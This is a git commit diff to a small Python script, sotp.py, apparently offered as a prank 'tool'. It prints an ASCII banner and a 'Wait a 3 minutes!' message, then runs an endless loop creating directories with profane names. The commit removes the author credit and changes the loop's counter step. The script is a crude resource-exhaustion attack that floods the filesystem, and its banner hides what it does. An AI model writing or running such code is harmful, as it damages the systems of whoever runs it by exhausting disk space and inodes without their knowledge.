06f37196cb530b27a048eafdfb066bd5679fb57b
Cyber_smile_54x45 <87195969+C7836-5M1L3@users.noreply.github.com>
2021-10-05 21:02:46 +0530

    Update sotp.py

--- sotp.py
+++ sotp.py
@@ -9,10 +9,9 @@ print('╚══╗║╚╝╠╣║║║═╣')
 print('║╚═╝║║║║║╚╣║═╣')
 print('╚═══╩╩╩╩╩═╩══╝\n\n')
 print('Wait a 3 minutes!')
-print('Tool coded by Cyber smile!')
 
 import os
 i=0
 while True:
     os.mkdir(f"fuckyou{i}")
-    i+=99999999999
+    i+=1
